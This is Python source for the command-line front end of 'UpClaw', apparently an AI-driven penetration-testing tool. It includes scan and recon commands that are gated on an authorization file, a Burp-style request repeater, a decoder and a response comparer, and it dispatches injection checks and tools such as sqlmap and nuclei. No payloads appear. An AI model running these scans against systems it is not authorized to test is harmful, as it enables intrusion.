def cmd_req(args: argparse.Namespace, cfg: dict[str, Any]) -> int:
    """Repeater 等价物：手动构造并重放单个 HTTP(S) 请求，展示完整往返与证据片段。"""
    url = args.target
    method = (args.method or "GET").upper()
    headers = {"User-Agent": str(cfg.get("user_agent", "UpClaw/0.1.0"))}
    for h in args.header or []:
        if ":" in h:
            k, _, v = h.partition(":")
            headers[k.strip()] = v.strip()
        else:
            print(f"[!] 忽略非法头: {h}（应为 'Name: value'）")
            return 2

    timeout = args.timeout or float(cfg.get("timeout", 6.0))
    print(f"[*] {method} {url}")
    if args.raw:
        print("----- 请求 -----")
        print(_manual_render_request(method, url, headers, args.data))

    r = http_request(
        url, method=method, headers=headers, body=args.data,
        timeout=timeout, follow_redirects=not args.no_redirects,
        verify_tls=bool(cfg.get("verify_tls", False)),
        user_agent=headers.get("User-Agent", ""),
    )
    if r.error:
        print(f"[✗] {r.error}")
        return 1

    print(f"[✓] HTTP {r.status} {r.reason}  ({round(r.elapsed, 2)}s)")
    for k, v in r.headers.items():
        print(f"    {k}: {v}")

    # 匹配检测：-m 关键词命中则高亮（用于确认漏洞触发，如 SQL 报错特征）
    if args.match:
        for m in args.match:
            hit = m.lower() in r.body.lower()
            mark = "命中" if hit else "未命中"
            print(f"    [{'!' if hit else 'i'}] 匹配 '{m}': {mark}")

    body_out = r.body if args.full_body else r.body[: args.body_limit]
    print("----- 响应体 -----")
    print(body_out)
    if not args.full_body and len(r.body) > args.body_limit:
        print(f"... [响应体已截断，共 {len(r.body)} 字符，用 --full-body 查看全部]")
    return 0


def cmd_codec(args: argparse.Namespace, cfg: dict[str, Any]) -> int:
    """Decoder 等价物：url/base64/hex/html 编解码。数据缺省时从 stdin 读取（支持管道）。"""
    action = args.action
    kind = args.type
    data = args.data
    if data is None:
        data = sys.stdin.read().rstrip("\n")
    if data is None or data == "":
        print("[!] 未提供数据（可用位置参数或管道输入）")
        return 2

    try:
        if action == "encode":
            if kind == "url":
                out = urllib.parse.quote(data, safe="")
            elif kind == "base64":
                out = base64.b64encode(data.encode("utf-8")).decode("ascii")
            elif kind == "hex":
                out = data.encode("utf-8").hex()
            elif kind == "html":
                out = html.escape(data)
            else:
                raise SystemExit(f"[!] 不支持的编码类型: {kind}（url/base64/hex/html）")
        else:  # decode
            if kind == "url":
                out = urllib.parse.unquote(data)
            elif kind == "base64":
                out = base64.b64decode(data).decode("utf-8", errors="replace")
            elif kind == "hex":
                out = binascii.unhexlify(data).decode("utf-8", errors="replace")
            elif kind == "html":
                out = html.unescape(data)
            else:
                raise SystemExit(f"[!] 不支持的编码类型: {kind}（url/base64/hex/html）")
    except (binascii.Error, ValueError) as e:
        print(f"[✗] 解码失败（数据格式非法）: {e}")
        return 1

    print(out)
    return 0


def cmd_cmp(args: argparse.Namespace, cfg: dict[str, Any]) -> int:
    """Comparer 等价物：对同一目标的两次变体请求做响应对比，辅助判断注入/越权是否生效。"""
    ra = http_request(args.target_a, timeout=args.timeout or float(cfg.get("timeout", 6.0)),
                      verify_tls=bool(cfg.get("verify_tls", False)))
    rb = http_request(args.target_b, timeout=args.timeout or float(cfg.get("timeout", 6.0)),
                      verify_tls=bool(cfg.get("verify_tls", False)))
    if not ra.ok or not rb.ok:
        print(f"[✗] 请求失败 A: {ra.error or ra.status} / B: {rb.error or rb.status}")
        return 1

    print(f"  A {args.target_a}")
    print(f"    HTTP {ra.status} · 长度 {len(ra.body)} · {round(ra.elapsed, 2)}s")
    print(f"  B {args.target_b}")
    print(f"    HTTP {rb.status} · 长度 {len(rb.body)} · {round(rb.elapsed, 2)}s")

    # 头部差异
    ha, hb = {k.lower(): v for k, v in ra.headers.items()}, {k.lower(): v for k, v in rb.headers.items()}
    diff_h = [f"  - {k}: {v}" for k, v in ha.items() if ha.get(k) != hb.get(k)]
    diff_h += [f"  + {k}: {v}" for k, v in hb.items() if k not in ha or ha.get(k) != v]
    if diff_h:
        print("  [头差异]")
        for line in diff_h[:10]:
            print(line)
    else:
        print("  [头差异] 无")

    # 正文差异（统一 diff 前 N 行）
    la = ra.body.splitlines()
    lb = rb.body.splitlines()
    if la == lb:
        print(f"  [正文差异] 无（两响应完全一致）")
        return 0
    ratio = difflib.SequenceMatcher(None, la, lb).ratio()
    print(f"  [正文差异] 相似度 {round(ratio * 100, 1)}%")
    diff = list(difflib.unified_diff(la, lb, "resp-A", "resp-B", lineterm="", n=1))
    shown = 0
    for line in diff:
        if line.startswith(("---", "+++", "@@")):
            continue
        if shown >= args.diff_lines:
            print(f"  ... 差异行超过 {args.diff_lines} 行，已截断")
            break
        if line.startswith("-"):
            print(f"  {line}")
        elif line.startswith("+"):
            print(f"  {line}")
        shown += 1
    return 0


def cmd_scan(args: argparse.Namespace, cfg: dict[str, Any]) -> int:
    started = time.time()
    raw_targets = [t.strip() for t in args.target.split(",") if t.strip()]
    if not raw_targets:
        print("[!] 未指定目标")
        return 2

    # 授权门禁（合规红线）
    if not require_authorization(raw_targets, args.yes, args.auth_file):
        return 3

    target = raw_targets[0]
    url, note = _pick_url(target, cfg)
    if not url:
        print(f"[!] {note}")
        return 2
    if note:
        print(f"[i] {note}")

    host, port, _, _ = parse_target(url)
    print(f"\n[*] 目标: {url}  ({host})")

    store = FindingStore()
    recon_data: dict[str, Any] = {}

    # ---- 信息收集 ----
    print("[*] 阶段 1/3  HTTP 指纹识别...")
    fp = fingerprint(url, cfg)
    recon_data["fingerprint"] = fp
    if fp.get("error"):
        print(f"    [!] HTTP 请求失败: {fp['error']}")
    else:
        print(f"    [{fp.get('status')}] Server={fp.get('server') or '-'} "
              f"标题={fp.get('title') or '-'}")
        if fp.get("technologies"):
            print(f"    技术栈: {', '.join(fp['technologies'])}")

    ports: list[dict[str, Any]] = []
    if not args.skip_ports:
        print("[*] 阶段 1/3  端口扫描...")
        ports = scan_ports(
            host,
            ports=_parse_ports(args.ports),
            timeout=float(args.port_timeout),
            threads=int(cfg.get("threads", 16)),
            max_ports=int(cfg.get("max_ports", 1024)),
        )
        recon_data["ports"] = ports
        if ports:
            print(f"    开放 {len(ports)} 个端口: "
                  + ", ".join(f"{p['port']}/{p['service']}" for p in ports[:12])
                  + (" ..." if len(ports) > 12 else ""))
        else:
            print("    未发现开放端口")

    print("[*] 阶段 2/3  常见路径探测...")
    probes = probe_paths(url, None, cfg, threads=int(cfg.get("threads", 16)))
    recon_data["paths"] = probes
    accessible = [p for p in probes if p.get("status") == 200]
    risky = [p for p in probes if p.get("risky")]
    print(f"    探测 {len(SENSITIVE_PATHS)} 个路径，可访问(200) {len(accessible)} 个"
          f"（其中高危 {len(risky)} 个）")

    # ---- 漏洞检测 ----
    print("[*] 阶段 3/3  安全检测...")
    checks = [c.strip() for c in (args.checks or DEFAULT_CHECKS).split(",") if c.strip()]
    for name in checks:
        mod = AVAILABLE.get(name)
        if not mod:
            print(f"    [!] 未知检测模块: {name}")
            continue
        if name == "headers":
            mod(store, url, fp)
        elif name == "sensitive":
            mod(store, url, probes)
        elif name in ("sqli", "xss"):
            if "?" not in url:
                print(f"    [i] 跳过 {name}：URL 无查询参数")
                continue
            mod(store, url, cfg)
        else:
            # 其余模块统一签名 (store, url, cfg)
            mod(store, url, cfg)
        if args.verbose:
            print(f"    · {name} 完成")

    # ---- 外部工具适配（v0.3，自动检测本机已装工具）----
    if not getattr(args, "no_ext", False):
        run_external_phase(store, url, cfg, args)

    # ---- 输出 ----
    meta = build_meta(url, started, cfg)
    out_dir = args.output or str(cfg.get("output_dir", "reports"))
    fmts = [f.strip() for f in (args.format or str(cfg.get("format", "html"))).split(",") if f.strip()]
    paths = save_reports(out_dir, meta, store, recon_data, fmts)

    v, u = store.verified(), store.unverified()
    counts = store.counts()
    print("\n" + "=" * 60)
    print(f"  扫描完成 · 耗时 {meta['duration_sec']}s")
    print("=" * 60)
    print(f"  已验证发现 {len(v)} 项: " + "  ".join(f"{k}={counts[k]}" for k in ["CRITICAL","HIGH","MEDIUM","LOW","INFO"] if counts[k]))
    if u:
        print(f"  待人工复核 {len(u)} 项（未纳入交付结论）")
    print(f"\n  报告输出:")
    for k, p in paths.items():
        print(f"    [{k.upper():4s}] {p}")
    print()
    return 0


def cmd_recon(args: argparse.Namespace, cfg: dict[str, Any]) -> int:
    """仅做信息收集（不执行漏洞检测）。"""
    started = time.time()
    raw_targets = [t.strip() for t in args.target.split(",") if t.strip()]
    if not require_authorization(raw_targets, args.yes, args.auth_file):
        return 3
    target = raw_targets[0]
    url, note = _pick_url(target, cfg)
    if note:
        print(f"[i] {note}")
    host, port, _, _ = parse_target(url)

    print(f"\n[*] 目标: {url} ({host})")
    fp = fingerprint(url, cfg)
    print("\n--- HTTP 指纹 ---")
    if fp.get("error"):
        print(f"  [!] {fp['error']}")
    else:
        print(f"  状态码  : {fp.get('status')}")
        print(f"  Server  : {fp.get('server') or '-'}")
        print(f"  标题    : {fp.get('title') or '-'}")
        print(f"  技术栈  : {', '.join(fp.get('technologies') or []) or '-'}")
        print(f"  缺失头  : {', '.join(fp.get('missing_security_headers') or []) or '无'}")

    if not args.skip_ports:
        print("\n--- 开放端口 ---")
        ports = scan_ports(
            host, ports=_parse_ports(args.ports),
            timeout=float(args.port_timeout), threads=int(cfg.get("threads", 16)),
        )
        if ports:
            for p in ports:
                b = f"  banner: {p['banner'][:60]}" if p.get("banner") else ""
                print(f"  {p['port']:>5}/tcp  {p['service']}{b}")
        else:
            print("  无")

    print("\n--- 路径探测 ---")
    probes = probe_paths(url, None, cfg, threads=int(cfg.get("threads", 16)))
    for p in probes:
        flag = " [高危]" if p.get("risky") else ""
        print(f"  {p['status']}  {p['path']}  ({p['length']}B){flag}")
    print(f"\n完成，耗时 {round(time.time()-started,2)}s\n")
    return 0


def cmd_doctor(args: argparse.Namespace, cfg: dict[str, Any]) -> int:
    """环境与配置自检。"""
    print("\nUpClaw 自检\n")
    print(f"  Python      : {sys.version.split()[0]}")
    print(f"  UpClaw      : v{__version__}")
    print(f"  配置文件    : {CONFIG_PATH} {'[存在]' if __import__('os').path.isfile(CONFIG_PATH) else '[未创建，使用默认值]'}")
    print(f"  开源许可    : Apache-2.0（全量开源，免费使用）")

    # 网络连通性
    test = args.target or "https://example.com"
    print(f"\n  连通性测试  : {test}")
    r = http_request(test, timeout=8.0, verify_tls=False, user_agent=str(cfg.get("user_agent")))
    if r.ok:
        print(f"    [✓] HTTP {r.status} ({round(r.elapsed,2)}s)")
    else:
        print(f"    [✗] {r.error or '失败'}")
        print("    提示：若使用代理，请配置 config 的 proxy 项。")

    # 模型配置
    if cfg.get("base_url") and cfg.get("api_key"):
        print(f"\n  模型服务    : 已配置 ({cfg.get('base_url')})")
    else:
        print("\n  模型服务    : 未配置（AI 推理功能不可用，扫描功能不受影响）")

    # 外部工具
    status = ext_tool_status()
    installed = [i for i in status.values() if i["installed"]]
    print(f"\n  外部工具    : {len(installed)}/{len(status)} 已检测到")
    for info in status.values():
        if info["installed"]:
            mark = "·" if not info.get("manual") else "·(需人工/API)"
            print(f"    [{mark}] {info['display']:<14} {info['path']}")
    if not installed:
        print("    提示: 安装 nuclei/nmap/sqlmap 等工具后，扫描将自动调用（见 `upclaw tools`）")
    print()
    return 0


def cmd_version(args: argparse.Namespace, cfg: dict[str, Any]) -> int:
    print(f"upclaw {__version__}")
    return 0


def cmd_tools(args: argparse.Namespace, cfg: dict[str, Any]) -> int:
    """列出外部工具检测状态。"""
    print("\nUpClaw 外部工具检测\n")
    status = ext_tool_status()
    print(f"  {'工具':<16}{'类别':<18}{'状态':<12}路径")
    print(f"  {'-'*16}{'-'*18}{'-'*12}{'-'*40}")
    for name, info in status.items():
        if info.get("manual"):
            st = "自动扫描不可用" if not info["installed"] else "已安装·需人工/API"
        else:
            st = "已安装" if info["installed"] else "未安装"
        disp = info["display"]
        cat = info["category"]
        path = info["path"] if info["installed"] else "-"
        print(f"  {disp:<16}{cat:<18}{st:<12}{path[:40]}")
    print("\n说明:")
    print("  · 可自动执行的工具（nuclei/nmap/sqlmap/nikto/ffuf/dirsearch/subfinder/httpx/zap）")
    print("    在 scan 时被自动调用，结果统一进入 UpClaw 报告；")
    print("    可用 --no-ext 关闭，--ext-tools nuclei,sqlmap 只启用指定工具。")
    print("  · Yakit/BeEF/Burp Suite/AppScan/ARL 为 GUI/API 类工具，请按其文档人工驱动。")
    print("  · ffuf 需字典：config set wordlist <路径> 或放置到常见路径。")
    print()
    return 0


# ---------------------------------------------------------------- 参数解析

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="upclaw",
        description="UpClaw — AI 驱动的渗透测试 CLI 工具（仅用于已授权的安全测试）",
        epilog="示例:\n"
               "  upclaw scan example.com\n"
               "  upclaw scan 'https://test.site/page?id=1' --auth-file auth.json\n"
               "  upclaw recon 192.168.1.10 --skip-ports\n",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--version", action="version", version=f"upclaw {__version__}")
    sub = p.add_subparsers(dest="cmd", required=True)

    def add_common(sp: argparse.ArgumentParser) -> None:
        sp.add_argument("--yes", action="store_true",
                        help="假设已授权（不能替代授权文件，无 --auth-file 时会被拒绝）")
        sp.add_argument("--auth-file", help="授权文件路径（JSON），用于非交互场景")
        sp.add_argument("--timeout", type=float, default=None, help="HTTP 超时（秒）")
        sp.add_argument("--rate-limit", type=float, default=None, help="请求间隔（秒）")

    # scan
    s = sub.add_parser("scan", help="完整扫描（信息收集 + 安全检测）")
    s.add_argument("target", help="目标，如 example.com 或 https://x.com/p?id=1")
    add_common(s)
    s.add_argument("--checks", help="启用模块，逗号分隔，默认全部内置模块（dns,subdomain,waf,tls,cmdi,ssrf,xxe,lfi,open-redirect,crlf,dir,backup,fuzz,cors,cookie,methods,webdav,headers,sensitive,sqli,xss；外部工具: nuclei,nmap,sqlmap,nikto,ffuf,dirsearch,subfinder,httpx,zap）")
    s.add_argument("--no-ext", action="store_true",
                   help="关闭外部工具适配阶段（默认自动调用已安装的外部工具）")
    s.add_argument("--ext-tools", help="仅启用指定外部工具，逗号分隔，如 nuclei,sqlmap")
    s.add_argument("--ports", help="端口列表，如 80,443 或 1-1000")
    s.add_argument("--skip-ports", action="store_true", help="跳过端口扫描")
    s.add_argument("--port-timeout", type=float, default=1.5, help="端口连接超时")
    s.add_argument("--output", help="报告输出目录")
    s.add_argument("--format", help="报告格式，逗号分隔（html,md,json）")
    s.add_argument("-v", "--verbose", action="store_true", help="输出详细信息")
    s.set_defaults(func=cmd_scan)

    # recon
    r = sub.add_parser("recon", help="仅信息收集（指纹/端口/路径）")
    r.add_argument("target", help="目标")
    add_common(r)
    r.add_argument("--ports", help="端口列表")
    r.add_argument("--skip-ports", action="store_true", help="跳过端口扫描")
    r.add_argument("--port-timeout", type=float, default=1.5)
    r.set_defaults(func=cmd_recon)

    # init
    i = sub.add_parser("init", help="交互式初始化配置")
    i.set_defaults(func=lambda a, c: init_interactive() or 0)

    # config
    c = sub.add_parser("config", help="查看或修改配置")
    c.add_argument("action", choices=["show", "get", "set", "reset"], nargs="?", default="show")
    c.add_argument("key", nargs="?")
    c.add_argument("value", nargs="?")
    c.set_defaults(func=_cmd_config)

    # doctor / version
    d = sub.add_parser("doctor", help="环境与网络自检")
    d.add_argument("target", nargs="?", help="连通性测试目标")
    d.set_defaults(func=cmd_doctor)

    t = sub.add_parser("tools", help="列出外部工具检测状态")
    t.set_defaults(func=cmd_tools)

    # req —— Burp Repeater 等价物
    rq = sub.add_parser("req", help="手动改包重放单请求（Repeater）")
    rq.add_argument("target", help="目标 URL，如 http://192.168.1.10/dvwa/vulnerabilities/sqli/?id=1")
    rq.add_argument("-X", "--method", help="HTTP 方法，默认 GET")
    rq.add_argument("-H", "--header", action="append", help="请求头，可多次，如 'Cookie: a=b; security=low'")
    rq.add_argument("-d", "--data", help="请求体（POST data）")
    rq.add_argument("-m", "--match", action="append", help="响应体匹配关键词，可多次（用于确认漏洞触发）")
    rq.add_argument("--body-limit", type=int, default=2000, help="响应体显示上限，默认 2000")
    rq.add_argument("--full-body", action="store_true", help="显示完整响应体")
    rq.add_argument("--no-redirects", action="store_true", help="不跟随重定向")
    rq.add_argument("--raw", action="store_true", help="回显将要发送的原始请求")
    rq.add_argument("--timeout", type=float, default=None, help="HTTP 超时（秒）")
    rq.set_defaults(func=cmd_req)

    # codec —— Burp Decoder 等价物
    cd = sub.add_parser("codec", help="编解码（Decoder）：url/base64/hex/html")
    cd.add_argument("action", choices=["encode", "decode"], help="encode 编码 / decode 解码")
    cd.add_argument("type", choices=["url", "base64", "hex", "html"], help="编解码类型")
    cd.add_argument("data", nargs="?", help="数据（缺省时从 stdin 读取，支持管道）")
    cd.set_defaults(func=cmd_codec)

    # cmp —— Burp Comparer 等价物
    cp = sub.add_parser("cmp", help="双请求响应对比（Comparer）")
    cp.add_argument("target_a", help="基准 URL")
    cp.add_argument("target_b", help="变体 URL（注入/越权 payload 后的请求）")
    cp.add_argument("--diff-lines", type=int, default=20, help="正文差异显示行数，默认 20")
    cp.add_argument("--timeout", type=float, default=None, help="HTTP 超时（秒）")
    cp.set_defaults(func=cmd_cmp)

    v = sub.add_parser("version", help="显示版本")
    v.set_defaults(func=cmd_version)

    return p


def _cmd_config(args: argparse.Namespace, cfg: dict[str, Any]) -> int:
    if args.action == "show":
        print(json.dumps(cfg, ensure_ascii=False, indent=2))
    elif args.action == "get":
        print(cfg.get(args.key, ""))
    elif args.action == "set":
        if not args.key or args.value is None:
            print("[!] 用法: upclaw config set <key> <value>")
            return 2
        set_value(args.key, args.value)
        print(f"[✓] 已设置 {args.key} = {args.value}")
    elif args.action == "reset":
        reset()
    return 0


def main(argv: list[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    if args.cmd in ("version",):
        return args.func(args, {})

    cfg = load()
    # 命令行覆盖配置
    if getattr(args, "timeout", None) is not None:
        cfg["timeout"] = args.timeout
    if getattr(args, "rate_limit", None) is not None:
        cfg["rate_limit"] = args.rate_limit

    if args.cmd in ("scan", "recon"):
        print(BANNER)
    try:
        return args.func(args, cfg)
    except KeyboardInterrupt:
        print("\n[!] 已中断")
        return 130
    except SystemExit as e:
        raise e




if __name__ == "__main__":
    raise SystemExit(main())
